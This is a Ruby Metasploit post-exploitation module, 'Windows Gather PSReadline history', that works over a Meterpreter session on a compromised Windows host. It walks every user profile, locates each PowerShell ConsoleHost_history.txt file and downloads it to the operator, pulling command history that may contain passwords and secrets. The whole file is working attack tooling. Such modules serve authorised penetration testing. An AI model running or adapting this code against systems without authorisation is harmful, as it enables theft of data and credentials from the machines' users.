##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/user_profiles'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  STORE_FILE_TYPE = 'text/plain'

  def initialize(info={})
    super(update_info(info,
        'Name' => 'Windows Gather PSReadline history',
        'Description' => %q{
          Gathers Power Shell history data from the target machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  def run
    grab_user_profiles.each do |userprofile|
      gather_psreadline_history(userprofile)
    end
  end

  def gather_psreadline_history(profile)
    name = 'PSReadline'
    path = 'AppData'
    fname = "ConsoleHost_history.txt"
    file_path = "#{profile[path]}\\Microsoft\\Windows\\PowerShell\\PSReadline"
    files = session.fs.file.search(file_path, "#{fname}", true)

    return false unless files

    files.each do |file|
      local_loc = "#{profile['UserName']}_#{name}_#{fname}"
      file_loc = store_local("file", STORE_FILE_TYPE, session, local_loc)
      main_file_loc = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
      print_status("Downloading #{main_file_loc}")
      session.fs.file.download_file(file_loc, main_file_loc)
      print_good("#{name} history file saved to #{file_loc}")
    end
    return true
  end
end
